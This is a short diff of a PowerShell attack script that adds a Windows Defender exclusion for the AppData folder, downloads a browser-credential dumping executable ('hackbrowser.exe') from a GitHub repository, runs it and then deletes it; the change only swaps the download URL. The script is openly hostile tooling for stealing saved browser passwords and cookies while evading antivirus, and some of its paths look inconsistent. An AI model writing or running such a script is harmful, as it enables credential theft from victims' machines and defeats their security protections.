@@ -7,7 +7,7 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/david26099/hbduck/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
+Invoke-WebRequest -Uri "https://github.com/david26099/allc-scripts/blob/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
 cd $env:appdata\Local\dump
 ./hb.exe
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
